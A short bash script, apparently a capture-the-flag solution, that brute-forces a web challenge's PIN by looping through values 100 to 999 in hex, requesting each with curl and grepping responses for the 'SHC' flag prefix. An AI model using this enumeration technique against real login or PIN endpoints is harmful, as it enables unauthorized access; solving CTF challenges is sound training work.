#!/bin/bash
max=999
for i in `seq 100 $max`
do
	h=$(printf '%x\n' $i)
    curl --silent http://ctf.sucurihc.org/flag/eua/web50/?pin=$h --stderr - | grep 'SHC'
done
echo "fim"